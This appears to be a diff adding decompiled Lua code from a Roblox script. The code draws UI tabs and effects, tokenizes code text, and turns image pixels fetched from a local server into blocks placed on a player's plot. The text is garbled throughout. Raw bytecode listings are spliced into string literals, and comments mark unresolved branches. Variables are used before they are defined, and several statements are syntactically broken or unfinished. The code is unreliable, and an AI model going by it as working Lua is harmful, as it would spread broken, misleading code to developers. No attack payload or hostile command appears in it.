+    return p0:gsub(".", function(p0)
+        if config2[p0] ~= nil then
+
+            return " "
+
+        end
+
+        return p0
+    end):gsub("%S+", function(p0)
+        if config[p0] ~= nil then
+
+            return p0
+
+        end
+
+        -- [8] TailCall: return R1(R2, R3)
+
+        return " ":rep
+    end)
+
+end
+
+local function func_eb2455ba(p0)
+    local config = {}
+    config["="] = true
+    config["."] = true
+    config[","] = true
+    config["("] = true
+    config[")"] = true
+    config["["] = true
+    config["]"] = true
+    config["{"] = true
+    config["}"] = true
+    config[":"] = true
+    config["*"] = true
+    config["/"] = true
+    config["+"] = true
+    config["-"] = true
+    config["%"] = true
+    config[";"] = true
+    config["~"] = true
+    local v = ""
+    p0:gsub(".", function(p0)
+        if config[p0] ~= nil then
+            v = v .. p0
+        else
+            if p0 == "
+" then
+                v = v .. "
+"
+            else
+                if p0 == "	" then
+                    v = v .. "	"
+                else
+                    v = v .. " "
+                end
+            end
+        end
+    end)
+
+    return v
+
+end
+
+local function func_05ede4cc(p0)
+    local v = ""
+    p0:gsub("[^\n]+", function(p0)
+        local _upv0 = 0
+        local _upv2 = false
+        p0:gsub(".", function(p0)
+            _upv0 = _upv0 + 1
+
+            if p0:sub(_upv0, _upv0 + 1) == "--" then
+                _upv2 = true
+            end
+
+            if _upv2 == true then
+                v = v .. p0
+            else
+                v = v .. " "
+            end
+        end)
+        v = v
+    end)
+
+    return v
+
+end
+
+local function func_3b5b54e3(p0)
+    local v = ""
+    local _upv0 = false
+    p0:gsub(".", function(p0)
+        if _upv0 == false then
+
+            if p0 == """ then PC += 1
+[   4]	         Jmp	|    0 |    3 |    0 |	PC += 3
+[   5]	    LoadBool	|    1 |    1 |    0 |	_upv0 = true
+[   6]	    SetUpval	|    1 |    0 |    0 |	UPVALUE_0 = _upv0
+[   7]	         Jmp	|    0 |    7 |    0 |	PC += 7
+[   8]	    GetUpval	|    1 |    0 |    0 |	_upv0 = UPVALUE_0
+[   9]	          Eq	|    0 |    1 |  258 |	if _upv0 == true then PC += 1
+[  10]	         Jmp	|    0 |    4 |    0 |	PC += 4
+[  11]	          Eq	|    0 |    0 |  257 |	if p0 == """ then
+                _upv0 = false
+            end
+
+            local v = _upv0
+
+            if v == false then
+                -- Eq: if R0 == """ then PC += 1
+[  19]	         Jmp	|    0 |    5 |    0 |	PC += 5
+[  20]	    GetUpval	|    1 |    1 |    0 |	R1 = UPVALUE_1
+[  21]	       LoadK	|    2 |    1 |    0 |	R2 = """
+                v = v .. v2
+            else
+                if p0 == "
+" then
+                    v = v .. "
+"
+                else
+                    if p0 == "	" then
+                        v = v .. "	"
+                    else
+                        if _upv0 == true then
+                            v = v .. p0
+                        else
+                            if _upv0 == false then
+                                v = v .. " "
+                            end
+                        end
+                    end
+                end
+            end
+
+            return
+
+        end
+    end)
+
+    return v
+
+end
+
+local function func_95208984(p0)
+    local v = ""
+    local _upv0 = false
+    p0:gsub(".", function(p0)
+        if _upv0 == false then
+
+            if p0 == "[" then
+                _upv0 = true
+            else
+                if _upv0 == true and p0 == "]" then
+                    _upv0 = false
+                end
+            end
+
+            if _upv0 == false then
+
+                if p0 == "]" then
+                    v = v .. "]"
+                else
+                    if p0 == "
+" then
+                        v = v .. "
+"
+                    else
+                        if p0 == "	" then
+                            v = v .. "	"
+                        else
+                            if _upv0 == true then
+                                v = v .. p0
+                            else
+                                if _upv0 == false then
+                                    v = v .. " "
+                                end
+                            end
+                        end
+                    end
+                end
+
+                return
+
+            end
+        end
+    end)
+
+    return v
+
+end
+
+local function func_89fedad2()
+
+    return
+
+end
+
+local function func_8d8a9c57(...)
+
+    if _upv6 then
+
+        return
+
+    end
+
+    for v, v2 in next(_upv2:GetChildren) do
+
+        if not (v2:IsA("UIListLayout")) then
+            v2:GetChildren()[1].ImageColor3 = Color3.fromRGB(52, 53, 56)
+            func_7279f42e(v2, {
+                Size = UDim2.new(0, v2.AbsoluteSize.X, 0, 20),
+            }, v.tween_time)
+        end
+    end
+
+    for v3, v4 in next(_upv5:GetChildren) do
+        v4.Visible = false
+    end
+
+    func_7279f42e(v, {
+        Size = UDim2.new(0, v.AbsoluteSize.X, 0, 25),
+    }, v.tween_time)
+    v:GetChildren()[1].ImageColor3 = Color3.fromRGB(73, 75, 79)
+    v2.Visible = true
+
+    return
+
+end
+
+local function func_b130fec8(...)
+
+    for v, v2 in next(v3:GetChildren) do
+
+    end
+
+    return 25 + v2.AbsoluteSize.Y + 5
+
+end
+
+local function func_902daba1()
+
+    return
+
+end
+
+local function func_2f357391(...)
+    local v = Color3.fromHSV(v5, v6, v7)
+    v3.ImageColor3 = v
+    v4.ImageColor3 = Color3.fromHSV(v5, 1, 1)
+    pcall(func_902daba1, v)
+
+    return
+
+end
+
+local function func_fd2d30b9()
+
+    return
+
+end
+
+local function func_17e53384(p0, p1, p2, p3)
+    local config = {}
+    config.Name = p0
+    config.PPart = {
+        CFrame = p1,
+        CastShadow = false,
+        CanCollide = true,
+        Anchored = true,
+        Transparency = 0,
+        Color = p3.Color,
+        Size = p2,
+    }
+
+    return config
+
+end
+
+local function func_e342e885(p0, p1, p2, p3, p4)
+    local v = func_02c45d2f(p0)
+
+    if p3 ~= 0 then
+        -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+    else
+        local v2 = 1
+    end
+
+    if v == "invalid" then
+        -- [17] TailCall: return R6(R7)
+
+        return print
+
+    end
+
+    local v3 = HttpService2:JSONDecode(v)
+    local v4 = v3.dimensions[1]
+    local v5 = v3.dimensions[2]
+    local config = {}
+
+    for v6 = 0, v5 / v2 - 1 do
+
+        for v7 = 0, v4 / v2 - 1 do
+            local v8 = _upv4(v3.pixels[v6 * v4 + v7 + 1 * v2])
+            local v9 = GetPlot().CFrame + v8(-v7 * p2 + v4 / v2 * p2 / 2, -v6 * p2 + 5.1 + v5 / v2 * p2)
+            local v10 = v8(p2, p2, p2)
+
+            if p4 then
+                local v11 = v20(v4[p1])
+                v11.Parent = v5
+                v11.PPart.Size = v10
+                v11.PPart.Color = v8.Color
+                v11.PPart.CFrame = v9
+                v11.PPart.Anchored = true
+                v11.PPart.CanCollide = false
+                v11.PPart.Transparency = 1 - v8.Alpha
+            else
+                v16(config)
+            end
+        end
+    end
+
+    if not (p4) then
+
+        LoadBlocks(Decode(Encode(GetPreviewBlocks()), 1))
+    end
+
+    return
+
+end
+end
+
+local function func_523b0b3e(p0)
+    local config = {}
+    local _upv0 = setmetatable(config, {
+        __mode = "v",
+    })
+
+    return function(p0)
+        if not (_upv0[p0]) then
+            local v = p0(p0)
+        end
+
+        _upv0[p0] = v
+
+        return v
+    end
+
+end
+
+local function func_952739a8(p0)
+
+    return p0.TextBounds.X + 15
+
+end
+
+local function func_465ac58c(p0)
+
+    if v24 == 3 then
+        wait()
+
+        return false
+
+    end
+
+    if v24 == 2 then
+        wait()
+
+        return true
+
+    end
+
+    if v24 == 1 then
+
+        if p0 % 2 == 0 then
+
+            task.wait()
+        end
+
+        return true
+
+    end
+
+    return true
+
+end
+
+local function func_02c45d2f(p0)
+
+    if _upv0 ~= p0 then
+        print("New Request > " .. p0)
+        local config = {}
+        config.Url = "http://localhost:8080/GetImage"
+        config.Method = "POST"
+        local config2 = {}
+        config2["Content-Type"] = "application/json"
+        config.Headers = config2
+        config.Body = HttpService2:JSONEncode({
+            url = p0,
+        })
+        print("Got Body")
+    else
+        local v = _upv3
+    end
+
+    _upv0 = p0
+    _upv3 = v
+
+    return v
+
+end
+
+local function func_f0c4555a(...)
+    _upv0:Clear()
+
+    for v, v2 in next(ListBuilds) do
+        _upv0:Add(v2)
+    end
+
+    return
+
+end
+
+local function func_b8ebc2c5(p0, p1)
+    local v = p0.Position
+    local v2 = p1.Position
+    local v3 = p1.Size
+    local v4 = math.abs(p1.Rotation.Y)
+
+    if 89 < v4 and v4 < 91 then
+        local v5 = v3.X
+        local v6 = v3.Z
+    end
+
+    if v2.X - v6 / 2 < v.X and v.X < v2.X + v6 / 2 and v2.Z - v5 / 2 < v.Z and v.Z < v2.Z + v5 / 2 then
+
+        return true
+
+    end
+
+    return false
+
+end
+
+local function func_0cb289c8()
+    -- [12] TailCall: return R0(R1, R2)
+
+    return Vector2.new
+
+end
+
+local function func_6d04dc36(p0, p1)
+    local v = HttpService2:JSONDecode(func_02c45d2f(p0))
+    local v2 = #v.pixels - v6[p1].Value
+    _upv3:Clear()
+
+    if 0 < v2 then
+        -- [!] UNRESOLVED BRANCH: TestSet logic failed here
+    else
+    end
+
+    _upv3:Add(p1, #v.pixels, nil)
+
+    return
+
+end
+
+local function func_de519730(p0, p1, p2)
+
+    spawn(function(...)
+        p0.ClipsDescendants = true
+        local v = v2:FindFirstChild("Circle"):Clone()
+        v.Parent = p0
+        v.ZIndex = 1000
+        v.Position = UDim2.new(0, p1 - v.AbsolutePosition.X, 0, p2 - v.AbsolutePosition.Y)
+
+        if p0.AbsoluteSize.Y < p0.AbsoluteSize.X then
+        else
+            if p0.AbsoluteSize.X < p0.AbsoluteSize.Y then
+            else
+                if p0.AbsoluteSize.X == p0.AbsoluteSize.Y then
+                    local v2 = p0.AbsoluteSize.X * 1.5
+                end
+            end
+        end
+
+        v:TweenSizeAndPosition(UDim2.new(0, v2, 0, v2), UDim2.new(0.5, -v2 / 2, 0.5, -v2 / 2), "Out", "Quad", 0.5, false, nil)
+        func_7279f42e(v, {
+            ImageTransparency = 1,
+        }, 0.5)
+        wait(0.5)
+        v:Destroy()
+    end)
+
+    return
+
+end
+
+local function func_044287be(...)
+    local v = v2:FindFirstChild("UIListLayout"):Clone()
+    v.Parent = v3
+    local config = {}
+
+    for v2, v3 in next(v3:GetChildren) do
+
+        if not (v3:IsA("UIListLayout")) then
+            config[v3] = v3.AbsolutePosition
+        end
+    end
+
+    v:Destroy()
+
+    for v4, v5 in next(config) do
+        v4.Position = UDim2.new(0, v5.X, 0, v5.Y)
+    end
+
+    return
+
+end
+
+local function func_11d5ba8f(p0, p1)
+    local v = Instance.new(p0)
+
+    for v2, v3 in next(p1) do
+        v[v2] = v3
+    end
+
+    return v
+
+end
+
+local function func_7279f42e(p0, p1, p2)
+
+    if not (p2) then
+    end
+
+    TweenService:Create(p0, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), p1):Play()
+
+    return
+
+end
+
+local function func_bceddfab(p0, p1, p2)
+    local v = p2 / 255
+    local v2 = p1 / 255
+    local v3 = p0 / 255
+    local v4 = math.max(v3, v2, v)
+    local v5 = math.min(v3, v2, v)
+    local v6 = v4 - v5
+
+    if v4 == 0 then
+    else
+    end
+
+    if v4 == v5 then
+    else
+        if v4 == v3 then
+
+            if v2 < v then
+            else
+                if v4 == v2 then
+                else
+                    if v4 == v then
+                    end
+                end
+            end
+
+            return v3 - v2 / v6 + 4 / 6, v6 / v4, v4
+
+        end
+    end
+end
+
+local function func_74164eb3(p0, p1)
+    local v, v2 = pcall(function()
+        return p0[tostring(p1)]
+    end)
+
+    if v then
+
+        return v2
+
+    end
+
+    return
+
+end
